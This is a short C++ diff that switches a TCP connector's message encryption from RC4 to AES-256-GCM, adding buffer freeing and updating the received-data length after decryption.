@@ -274,8 +274,10 @@ void ConnectorTCP::Disconnect()
 void ConnectorTCP::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
 {
     if (plainData && plainSize > 0) {
-        EncryptRC4(plainData, plainSize, sessionKey, 16);
-        this->SendData(plainData, plainSize);
+        int encLen;
+        unsigned char* encData = EncryptAES256GCM(plainData, plainSize, sessionKey, &encLen);
+        this->SendData(encData, encLen);
+        MemFreeLocal((LPVOID*)&encData, encLen);
     }
     else {
         this->SendData(NULL, 0);
@@ -287,7 +289,9 @@ void ConnectorTCP::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
     }
 
     if (this->recvSize > 0 && this->recvData) {
-        DecryptRC4(this->recvData, this->recvSize, sessionKey, 16);
+        int plainLen;
+        DecryptAES256GCM(this->recvData, this->recvSize, sessionKey, &plainLen);
+        this->recvSize = plainLen;
     }
 }
 
